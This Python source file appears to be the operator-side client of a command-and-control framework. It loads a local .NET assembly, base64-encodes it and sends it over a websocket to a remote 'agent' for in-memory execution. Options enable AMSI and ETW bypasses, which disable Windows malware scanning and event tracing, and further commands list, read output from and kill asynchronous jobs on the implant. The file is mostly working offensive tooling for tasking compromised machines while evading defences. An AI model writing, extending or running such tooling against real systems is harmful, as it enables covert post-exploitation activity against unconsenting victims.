# client/src/gui/widgets/inline_assembly_handler.py

import os
import json
import base64
import hashlib
import threading
from pathlib import Path
from typing import Optional, Dict, List
from dataclasses import dataclass
from datetime import datetime
import uuid
import asyncio

@dataclass
class AssemblyFile:
    """Represents a .NET assembly file to be sent to agent"""
    path: str
    name: str
    type: str  # EXE or DLL
    size: int
    hash: str
    data: bytes

class InlineAssemblyHandler:
    """Handles inline-assembly command execution"""
    
    CHUNK_SIZE = 512 * 1024  # 512KB chunks (same as BOF)
    
    def __init__(self, websocket_client, agent_terminal):
        """Initialize inline-assembly handler with websocket and terminal references"""
        print(f"DEBUG InlineAssembly: Initializing InlineAssemblyHandler")
        self.ws_client = websocket_client
        self.agent_terminal = agent_terminal
        self.loaded_assemblies: Dict[str, AssemblyFile] = {}
        self.async_jobs: Dict[str, Dict] = {}
        self.upload_lock = threading.Lock()
        
    def handle_inline_assembly_command(self, command: str, args: List[str]) -> bool:
        """
        Main entry point for inline-assembly command handling
        Returns True if command was handled, False otherwise
        """
        print(f"DEBUG InlineAssembly: handle_inline_assembly_command called")
        print(f"DEBUG InlineAssembly: command: {command}")
        print(f"DEBUG InlineAssembly: args: {args}")
        
        # First, add the full command to history
        self._add_to_history(command, args)
        
        if command in ["inline-assembly", "execute-assembly", "inline-execute"]:
            return self._handle_inline_assembly_execute(args, async_mode=False)
        elif command == "inline-assembly-async":
            return self._handle_inline_assembly_execute(args, async_mode=True)
        elif command == "inline-assembly-jobs":
            return self._handle_inline_assembly_jobs()
        elif command == "inline-assembly-output":
            return self._handle_inline_assembly_output(args)
        elif command == "inline-assembly-kill":
            return self._handle_inline_assembly_kill(args)
        elif command == "inline-assembly-jobs-clean":  # ADD THIS
            return self._handle_inline_assembly_jobs_clean(args)
        elif command == "inline-assembly-jobs-stats":  # ADD THIS
            return self._handle_inline_assembly_jobs_stats()
        
        return False

    def _add_to_history(self, command: str, args: List[str]):
        """Add the full command to the command history buffer"""
        if self.agent_terminal and hasattr(self.agent_terminal, 'command_buffer'):
            full_command = command
            if args:
                full_command += " " + " ".join(args)
            
            timestamp = datetime.now().isoformat()
            username = self.agent_terminal.command_buffer.username or "user"
            formatted_command = {
                "timestamp": timestamp,
                "output": f"[{timestamp}] {username} > {full_command}"
            }
            #self.agent_terminal.command_buffer.add_output(formatted_command)
            #self.agent_terminal.update_display()
            self.agent_terminal.command_history.add_command(full_command)


    def _handle_inline_assembly_jobs_clean(self, args: List[str]) -> bool:
        """Clean completed/killed assembly jobs"""
        # Build command with optional job ID
        if args:
            job_id = args[0]
            command_str = f"inline-assembly-jobs-clean {job_id}"
            self._print_info(f"Cleaning job {job_id}...")
        else:
            command_str = "inline-assembly-jobs-clean"
            self._print_info("Cleaning all completed jobs...")
        
        command_msg = {
            "type": "agent_command",
            "data": {
                "command": command_str,
                "agent_id": self.agent_terminal.agent_guid,
                "command_id": str(uuid.uuid4()),
                "timestamp": datetime.now().isoformat()
            }
        }
        
        try:
            if hasattr(self.ws_client, 'ws_client') and self.ws_client.ws_client:
                future = asyncio.run_coroutine_threadsafe(
                    self.ws_client.ws_client.send_message(json.dumps(command_msg)),
                    self.ws_client.loop
                )
                future.result(timeout=5)
        except Exception as e:
            self._print_error(f"Failed to send clean command: {e}")
        
        return True

    def _handle_inline_assembly_jobs_stats(self) -> bool:
        """Get statistics about assembly jobs"""
        command_msg = {
            "type": "agent_command",
            "data": {
                "command": "inline-assembly-jobs-stats",
                "agent_id": self.agent_terminal.agent_guid,
                "command_id": str(uuid.uuid4()),
                "timestamp": datetime.now().isoformat()
            }
        }
        
        try:
            if hasattr(self.ws_client, 'ws_client') and self.ws_client.ws_client:
                future = asyncio.run_coroutine_threadsafe(
                    self.ws_client.ws_client.send_message(json.dumps(command_msg)),
                    self.ws_client.loop
                )
                future.result(timeout=5)
                self._print_info("Requesting job statistics...")
        except Exception as e:
            self._print_error(f"Failed to request statistics: {e}")
        
        return True

    def _handle_inline_assembly_execute(self, args: List[str], async_mode: bool = False) -> bool:
        """Execute a .NET assembly"""
        if len(args) < 1:
            self._print_error(f"Usage: {'inline-assembly-async' if async_mode else 'inline-assembly'} <path_to_assembly> [arguments...]")
            return True
        
        assembly_path = args[0]
        
        # Keep the FULL original command string including the file path
        full_args_string = " ".join(args) if args else ""  # This includes file path + all arguments
        
        # Parse remaining arguments after the file path
        assembly_args = []
        options = {
            'bypass_amsi': False,
            'bypass_etw': False,
            'revert_etw': False,
            'app_domain': 'InlineAssembly',
            'use_pipe': True
        }
        
        # Process arguments (same as before)
        i = 1
        while i < len(args):
            arg = args[i]
            
            if arg == '--amsi':
                options['bypass_amsi'] = True
                self._print_info("AMSI bypass enabled")
            elif arg == '--etw':
                options['bypass_etw'] = True
                self._print_info("ETW bypass enabled")
            elif arg == '--revert-etw':
                options['revert_etw'] = True
                self._print_info("ETW revert enabled")
            elif arg == '--app-domain' and i + 1 < len(args):
                options['app_domain'] = args[i + 1]
                i += 1
            elif not arg.startswith('--'):
                assembly_args.append(arg)
            
            i += 1
        
        # Rest of the validation and loading code stays the same...
        assembly_path = os.path.expanduser(assembly_path)
        
        if not os.path.exists(assembly_path):
            self._print_error(f"Assembly file not found: {assembly_path}")
            return True
        
        try:
            assembly_file = self._load_assembly_file(assembly_path)
            print(f"DEBUG InlineAssembly: Assembly loaded - {assembly_file.name}, {assembly_file.size} bytes, {assembly_file.type}")
        except Exception as e:
            self._print_error(f"Failed to load assembly: {e}")
            return True
        
        config = {
            "assembly_b64": base64.b64encode(assembly_file.data).decode('utf-8'),
            "arguments": assembly_args,
            "app_domain": options['app_domain'],
            "bypass_amsi": options['bypass_amsi'],
            "bypass_etw": options['bypass_etw'],
            "revert_etw": options['revert_etw'],
            "entry_point": "Main",
            "use_pipe": options['use_pipe'],
            "pipe_name": "",
            "async": async_mode
        }
        
        # Pass the full args string to _send_inline_assembly_command
        try:
            self._send_inline_assembly_command(assembly_file, config, async_mode, full_args_string)
        except Exception as e:
            self._print_error(f"Failed to send assembly: {e}")
            
        return True

    def _load_assembly_file(self, path: str) -> AssemblyFile:
        """Load and validate a .NET assembly file"""
        with open(path, 'rb') as f:
            data = f.read()
        
        # Check PE header
        if len(data) < 2 or data[0:2] != b'MZ':
            raise ValueError("Invalid assembly file: not a PE file")
        
        # Detect if DLL or EXE
        assembly_type = "DLL" if self._is_dll(data) else "EXE"
        
        return AssemblyFile(
            path=path,
            name=os.path.basename(path),
            type=assembly_type,
            size=len(data),
            hash=hashlib.sha256(data).hexdigest(),
            data=data
        )
    
    def _is_dll(self, data: bytes) -> bool:
        """Check if assembly is a DLL"""
        if len(data) < 0x40:
            return False
        
        try:
            pe_offset = int.from_bytes(data[0x3C:0x40], 'little')
            if len(data) < pe_offset + 24:
                return False
            
            if data[pe_offset:pe_offset+2] != b'PE':
                return False
            
            characteristics = int.from_bytes(data[pe_offset+22:pe_offset+24], 'little')
            return (characteristics & 0x2000) != 0
        except:
            return False
    
    def _send_inline_assembly_command(self, assembly_file: AssemblyFile, config: dict, async_mode: bool, full_args_string: str = ""):
        """Send inline-assembly command to agent via websocket"""
        #print(f"DEBUG InlineAssembly: Sending assembly {assembly_file.name}")
        #print(f"DEBUG InlineAssembly: Full args string: {full_args_string}")
        
        command_id = str(uuid.uuid4())
        
        if not self.agent_terminal or not self.agent_terminal.agent_guid:
            self._print_error("No agent selected")
            return
        
        if not self.ws_client:
            self._print_error("Not connected to server")
            return
        
        assembly_b64 = base64.b64encode(assembly_file.data).decode('utf-8')
        
        # Build the FULL command string for broadcasting (including file path)
        full_command = "inline-assembly-async" if async_mode else "inline-assembly"
        if full_args_string:
            full_command += " " + full_args_string  # This includes the file path
        
        # Build command message
        command_msg = {
            "type": "agent_command",
            "data": {
                "command": full_command,  # Send the FULL command including file path
                "agent_id": self.agent_terminal.agent_guid,
                "command_id": command_id,
                "filename": assembly_file.name,
                "currentChunk": 0,
                "totalChunks": 1,
                "assembly_b64": assembly_b64,
                "arguments_list": config.get("arguments", []),
                "app_domain": config.get("app_domain", "InlineAssembly"),
                "bypass_amsi": config.get("bypass_amsi", False),
                "bypass_etw": config.get("bypass_etw", False),
                "revert_etw": config.get("revert_etw", False),
                "entry_point": config.get("entry_point", "Main"),
                "timestamp": datetime.now().isoformat()
            }
        }
        
        #self._print_info(f"Sending assembly '{assembly_file.name}' ({assembly_file.type}, {assembly_file.size} bytes)...")
        
        try:
            if hasattr(self.ws_client, 'ws_client') and self.ws_client.ws_client:
                future = asyncio.run_coroutine_threadsafe(
                    self.ws_client.ws_client.send_message(json.dumps(command_msg)),
                    self.ws_client.loop
                )
                future.result(timeout=30)
            else:
                raise RuntimeError("Cannot find appropriate send method")
                
        except Exception as e:
            self._print_error(f"Failed to send assembly: {e}")
            return
        
        #self._print_success(f"Assembly '{assembly_file.name}' sent successfully")

    def _handle_inline_assembly_jobs(self) -> bool:
        """List async inline-assembly jobs"""
        # Send command to agent to list jobs
        command_msg = {
            "type": "agent_command",
            "data": {
                "command": "inline-assembly-jobs",
                "agent_id": self.agent_terminal.agent_guid,
                "command_id": str(uuid.uuid4()),
                "timestamp": datetime.now().isoformat()
            }
        }
        
        try:
            if hasattr(self.ws_client, 'ws_client') and self.ws_client.ws_client:
                future = asyncio.run_coroutine_threadsafe(
                    self.ws_client.ws_client.send_message(json.dumps(command_msg)),
                    self.ws_client.loop
                )
                future.result(timeout=5)
                #self._print_info("Requesting async job list...")
        except Exception as e:
            self._print_error(f"Failed to request job list: {e}")
        
        return True
    
    def _handle_inline_assembly_output(self, args: List[str]) -> bool:
        """Get output from async inline-assembly job"""
        if len(args) < 1:
            self._print_error("Usage: inline-assembly-output <job_id>")
            return True
        
        job_id = args[0]
        
        # IMPORTANT: Include the job_id in the command string itself
        command_msg = {
            "type": "agent_command",
            "data": {
                "command": f"inline-assembly-output {job_id}",  # <- FIX: Include job_id in command
                "agent_id": self.agent_terminal.agent_guid,
                "command_id": str(uuid.uuid4()),
                "timestamp": datetime.now().isoformat()
            }
        }
        
        try:
            if hasattr(self.ws_client, 'ws_client') and self.ws_client.ws_client:
                future = asyncio.run_coroutine_threadsafe(
                    self.ws_client.ws_client.send_message(json.dumps(command_msg)),
                    self.ws_client.loop
                )
                future.result(timeout=5)
                self._print_info(f"Requesting output for job {job_id}...")
        except Exception as e:
            self._print_error(f"Failed to request job output: {e}")
        
        return True

    def _handle_inline_assembly_kill(self, args: List[str]) -> bool:
        """Terminate async inline-assembly job"""
        if len(args) < 1:
            self._print_error("Usage: inline-assembly-kill <job_id>")
            return True
        
        job_id = args[0]
        
        # IMPORTANT: Include the job_id in the command string itself
        command_msg = {
            "type": "agent_command",
            "data": {
                "command": f"inline-assembly-kill {job_id}",  # <- FIX: Include job_id in command
                "agent_id": self.agent_terminal.agent_guid,
                "command_id": str(uuid.uuid4()),
                "timestamp": datetime.now().isoformat()
            }
        }
        
        try:
            if hasattr(self.ws_client, 'ws_client') and self.ws_client.ws_client:
                future = asyncio.run_coroutine_threadsafe(
                    self.ws_client.ws_client.send_message(json.dumps(command_msg)),
                    self.ws_client.loop
                )
                future.result(timeout=5)
                self._print_info(f"Sending kill signal for job {job_id}...")
        except Exception as e:
            self._print_error(f"Failed to kill job: {e}")
        
        return True

    def _print_info(self, message: str):
        """Print info message to terminal"""
        if self.agent_terminal:
            timestamp = datetime.now().isoformat()
            self.agent_terminal.command_buffer.add_output({
                "timestamp": timestamp,
                "output": f"[INFO] {message}"
            })
            self.agent_terminal.update_display()
    
    def _print_error(self, message: str):
        """Print error message to terminal"""
        if self.agent_terminal:
            timestamp = datetime.now().isoformat()
            self.agent_terminal.command_buffer.add_output({
                "timestamp": timestamp,
                "output": f"[ERROR] {message}"
            })
            self.agent_terminal.update_display()
    
    def _print_success(self, message: str):
        """Print success message to terminal"""
        if self.agent_terminal:
            timestamp = datetime.now().isoformat()
            self.agent_terminal.command_buffer.add_output({
                "timestamp": timestamp,
                "output": f"[SUCCESS] {message}"
            })
            self.agent_terminal.update_display()